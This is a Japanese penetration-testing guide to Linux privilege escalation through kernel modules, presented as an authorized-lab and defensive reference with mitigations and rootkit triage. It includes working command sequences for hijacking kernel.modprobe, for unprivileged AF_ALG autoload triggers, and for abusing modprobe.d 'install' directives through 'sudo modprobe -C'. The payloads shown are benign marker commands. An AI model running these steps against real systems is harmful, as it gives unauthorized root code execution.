# Kernel Modules と modprobe の悪用

{{#include ../../banners/hacktricks-training.md}}

## Kernel module と module-loading の設定ミス

Kernel module のサポートは、Linux の privilege escalation を調査する際に、影響の大きい領域です。unsigned-module に関するメッセージだけで悪用可能と判断せず、実際に役立つ次の質問への答えを確認してください。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- 現在のユーザーは、`sudo`、capabilities、または書き込み可能な helper path を通じて module をロードできますか？
- module のロードはまだ有効ですか？
- module signature enforcement は無効になっていますか？
- module directory、module file、または `modprobe.d` の設定 path は書き込み可能ですか？<sup>[[16]](#references)</sup>
- 何が起きたか確認するために、kernel log を読めますか？

まず、以下の module-status、signature、logging、module-tree の確認から、簡易トリアージを始めてください。<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

解釈:

- `modules_disabled=1` は、モジュールのロードもアンロードもできず、再起動するまで値を `0` に戻せないことを意味します。<sup>[[1]](#references)</sup>
- kernel command line の `module.sig_enforce=1` または `CONFIG_MODULE_SIG_FORCE=y` が設定されている場合、有効な署名付きモジュールが必要です。そうでない場合、署名のないモジュールがロードされ、kernel が taint される可能性があります。<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` では `dmesg` に制限はありません。値が `1` の場合、アクセスには `CAP_SYSLOG` が必要です。<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` 配下の書き込み可能なパスは危険です。モジュールのロード時に `modprobe` がこのツリーと依存関係データを検索するためです。<sup>[[8]](#references)</sup>

### モジュールのロードと kernel 出力の読み取り

ローカルモジュールをロードする正当な権限がある場合、`insmod` は指定した `.ko` ファイルをそのまま挿入します。ロードの一環としてモジュールの init 関数が実行され、`printk()` で書き込まれたメッセージは kernel log buffer に送られます。通常は `dmesg` で読み取ります。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

基本的な確認手順では、`modinfo` でメタデータを調べ、`insmod` と `rmmod` でモジュールをロードおよび削除し、`lsmod` でロード状態を確認して、`dmesg` で kernel log を調べます。<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

`sudo -l`で`insmod`、`modprobe`、またはそれらを呼び出すラッパーが許可されている場合は、重大な問題として扱ってください。`sudo -l`には、実行ユーザーの権限が表示されます。また、kernel moduleのロードには`CAP_SYS_MODULE`が必要です。capabilityを直接利用する方法については、[Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module)を参照してください。<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### Sudoで実行を許可された `insmod`

ユーザーに `insmod` の実行を許可する sudo ルールは、通常の管理用ヘルパーの実行を許可する場合とは同等ではありません。モジュールの初期化コードは挿入時に実行されるため、実際に確認すべきなのは、このユーザーがロードするモジュールを選択または変更できるかどうかです。<sup>[[3]](#references)</sup>

以下の一般的なレビュー手順では、候補モジュールについて、確認、ロード、状態、ログ、削除のチェックを繰り返します。<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

ユーザーが任意の`.ko`を指定できる場合、許可された評価では、これをシステム全体の侵害と見なす必要があります。より安全な運用方法は、sudoを通じたモジュールのロードを委任しないことです。避けられない場合は、正確なパス、所有者、権限、署名ポリシー、および削除手順を制限してください。<sup>[[3]](#references)[[10]](#references)</sup>

管理されたラボで無害なモジュールをビルドする方法として、以下に最小限のソースとMakefileを示します。`make -C /lib/modules/$(uname -r)/build M=$PWD`の形式は、外部モジュール向けにカーネルの文書で説明されているkbuildワークフローに従っています。<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

認可されたラボ内でのみビルドおよびロードしてください。kbuild は外部モジュールをビルドし、ロード/削除コマンドはカーネルモジュールインターフェースを呼び出します。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` の悪用チェック

`kernel.modprobe` は、module の自動ロード要求に対してカーネルが実行する userspace helper を指定します。この sysctl が影響するのは自動ロードであり、明示的な module 挿入ではありません。攻撃者がこの値を変更して書き込み可能な実行ファイルのパスを指定し、module 要求を発生させられる場合、その helper は特権でコードを実行する経路になります。空文字列に設定すると自動ロード要求は無効になります。`CONFIG_STATIC_USERMODEHELPER=y` の場合、空でない値はコンパイル時に組み込まれた静的 helper のパスで上書きされます。<sup>[[1]](#references)</sup>

カーネルの sysctl インターフェースで現在の helper パスを確認し、対象の所有者とモードを調べます。<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

sysctl、委任されたsudoルール、またはファイルケーパビリティに影響を与えられるか確認します。<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

以下のラボ環境限定のパターンは、helper pathを変更し、文書化されたモジュール自動ロード要求を発生させます。隔離された、使用を許可されたシステムでのみ使用してください。<sup>[[1]](#references)</sup>

現在のLinuxカーネルでは、汎用的なトリガーとして未知の実行ファイルを使用しないでください。従来のカスタムバイナリ形式によるモジュール自動ロード機能はLinux 6.14で削除されました。一方、カーネルのドキュメントでは、未知のファイルシステムがモジュール自動ロード要求の経路として記載されています。<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

強化されたシステムでは、権限によって `kernel.modprobe` への非特権書き込みが禁止されている場合、ヘルパーのパスに書き込みできない場合、またはモジュールの自動読み込みが無効になっている場合、この操作は失敗するはずです。<sup>[[1]](#references)</sup>

### 非特権ユーザーによる AF_ALG autoload trigger

上記のファイルシステムトリガーでは、特権が必要な `mount` を使用します。<sup>[[1]](#references)</sup> AF_ALG ソケットが利用可能な場合、非特権ユーザーは、意図的に存在しない type にソケットを bind する方法を使えます。<sup>[[17]](#references)[[18]](#references)</sup> すると `alg_bind()` は `request_module()` を通じて `algif-<type>` を要求し、設定済みのモジュールヘルパーを呼び出します。<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> この方法は、Linux 6.14 で従来の unknown-binary-format autoloading が削除された後も機能します。<sup>[[11]](#references)[[17]](#references)</sup> type は存在しないため `bind()` の失敗は想定どおりです。ソケットの戻り値ではなく、ヘルパーによる副作用を確認してください。<sup>[[17]](#references)[[18]](#references)</sup>

許可されたラボ環境では、まず制御下にあるヘルパーまたは `modprobe.d` ルールを設定し、その後 `sudo` や `CAP_SYS_MODULE` を使わずにリクエストを1回発行します。<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6 以降では、AF_ALG の `(type, name)` bind tuple を使用できます。<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

この経路には、使用可能な AF_ALG socket と空でない `kernel.modprobe` が必要です。<sup>[[1]](#references)[[18]](#references)</sup> `/proc/sys/crypto/af_alg_restrict` があるカーネルでは、値 `2` は AF_ALG socket の作成を無効にします。値 `1` はアルゴリズムを制限しますが、`alg_bind()` における存在しないタイプの要求は阻止しません。<sup>[[18]](#references)[[21]](#references)</sup> LSM は helper の呼び出し前にモジュール要求を拒否する場合があります。<sup>[[19]](#references)</sup>

### 書き込み可能な `modprobe.d` 設定と `sudo modprobe -C`

モジュールを解決する前に、`modprobe` は優先順位に従って、`/etc/modprobe.d`、`/run/modprobe.d`、`/usr/local/lib/modprobe.d`、`/usr/lib/modprobe.d`、`/lib/modprobe.d` などの設定ディレクトリから `.conf` ファイルを読み込みます。優先順位の高いディレクトリに同名のファイルがある場合、低い優先順位のファイルは隠されます。さらに重要なのは、`install <module> <command>` ディレクティブが、そのモジュールを挿入する**代わりに**任意の shell command を実行することです。そのため、書き込み可能な設定パスは、後から特権を持つ `modprobe` の呼び出し元の権限で実行される遅延コマンド実行につながる可能性があります。カーネルモジュールの署名強制は、この userspace command を認証しません。<sup>[[16]](#references)</sup>

ディレクトリとファイルの権限を監査し、その後、有効な設定を確認してください。`modprobe -n -v` は dry-run mode ではモジュールを挿入せず、`install`/`remove` command も実行しないため、解決結果の確認に安全です。非推奨の `--showconfig` 表記は、現行の kmod ドキュメントで kmod 36 以降に削除予定とされているため、`modprobe -c` を優先してください。<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

`modprobe` に対する制限のない sudo ルールは、任意の `.ko` ファイルが署名検証を通過できない場合でも悪用できます。`-C` で攻撃者が制御する設定ディレクトリを指定すると、sudo で起動されたプロセスがそこから `install` コマンドを実行できます。<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

カーネルのヘルパーから見える `modprobe.d` ディレクトリが書き込み可能な場合、同じ[AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger)によって、管理者が `modprobe` を実行するのを待たずに、`install algif-htprobe` ディレクティブを即座に実行できます。<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> 許可されたラボ環境では、書き込み可能な `.conf` に無害なマーカーコマンドを記述し、`modprobe -n -v algif-htprobe` で解決結果を確認してから、上記のトリガーを実行してください。<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` とモジュール署名の強制は、モジュールの挿入を阻止しますが、このユーザー空間の `install` コマンドは阻止しません。一方、空の `kernel.modprobe` またはブロックされた AF_ALG パスは、この autoload 経路を阻止します。<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

緩和策として、引数に制限のない `modprobe` の実行を sudo で許可せず、すべての設定ディレクトリを root 所有かつ書き込み不可にし、予期しない `install`/`remove` ディレクティブを確認してください。信頼できる管理ワークフローで、特定のモジュールについてこのようなディレクティブを回避する必要がある場合、`modprobe --ignore-install` を使うと、その名前付きモジュールのディレクティブは無視されます。ただし、依存モジュールには独自のコマンドが設定されている場合があります。<sup>[[8]](#references)[[16]](#references)</sup>

### 書き込み可能な `/lib/modules` の確認

書き込み可能なモジュールディレクトリは、後で `modprobe` がどのように呼び出されるかによって、モジュールの置き換え、悪意のあるモジュールの配置、または自動ロードの悪用につながる可能性があります。`modprobe` は `/lib/modules/$(uname -r)` を検索し、モジュールの解決時にその依存関係データを使用します。<sup>[[8]](#references)</sup>

現在のカーネルリリースのモジュールツリーにある、書き込み可能なモジュールファイルと依存関係／エイリアスのメタデータを確認してください。<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

書き込み可能なモジュールコンテンツが見つかった場合は、`modprobe` が依存関係をどのように解決するか、また `modinfo` がモジュールのメタデータをどのように表示するかを調べてください。<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

防御上の注意点:

- `/lib/modules` の所有者を `root:root` にし、ユーザーが書き込めないようにします。<sup>[[8]](#references)</sup>
- 運用上可能な場合は、起動後に `kernel.modules_disabled=1` を設定します。<sup>[[1]](#references)</sup>
- loadable modules が必要なシステムでは、module signing を強制します。<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe`、`/lib/modules`、`modprobe.d` の設定ディレクトリへの書き込みに加え、予期しない `insmod`/`modprobe` の実行を監視します。<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Module-based rootkit triage

悪意のあるモジュールは、syscall、VFS や `/proc` のビュー、ネットワーク経路、または認証情報のチェックにフックを仕掛け、プロセスやファイルを隠したり、トラフィックをリダイレクトしたり、秘密情報を傍受したりできます。また、`lsmod` が表示するモジュール一覧から自身を削除することもできます。永続化には、`modprobe.d` の aliases や install ルール、`/etc/modules-load.d`、systemd unit、initramfs の内容、または正規の `.ko` ファイルの置き換えが使われることがあります。通常の `lsmod` の結果は有用な証拠ですが、kernel-level compromise によって、カーネルが提供する一覧の信頼性が損なわれる可能性があります。ロード済みモジュール、ディスク上のファイル、起動設定、モジュール読み込みログ、信頼できる外部テレメトリーを照合してください。

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

予期しないモジュール名、パス、依存関係、署名、ロード時刻を確認してください。Kernel taint や unsigned-module のメッセージは手掛かりにはなりますが、rootkit の証拠ではありません。rootkit が疑われる場合は、稼働中の kernel の出力を信頼する前に、信頼できるイメージまたはリカバリー環境から証拠を収集してください。[kernel vulnerability assessment](kernel-vulnerability-assessment.md) ページでは、tracefs や pinned BPF objects を含む、設定と診断情報の露出について解説しています。



## References

- [1] [/proc/sys/kernel/ に関するドキュメント — Linux Kernel ドキュメント](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module 署名機能 — Linux Kernel ドキュメント](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux マニュアルページ](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver の基本 — Linux Kernel ドキュメント](https://docs.kernel.org/driver-api/basics.html)
- [6] [printk によるメッセージの記録 — Linux Kernel ドキュメント](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [外部モジュールのビルド — Linux Kernel ドキュメント](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux マニュアルページ](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [タグ 'execve-v6.14-rc1' のマージ — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux マニュアルページ](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [modprobe_path Technique の復活: search_binary_handler() Patch の克服 — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [AF_ALG bind とモジュール要求 — Linux kernel ソースコード](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Module helper の呼び出し — Linux kernel ソースコード](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Python ドキュメント](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Linux kernel ドキュメント](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
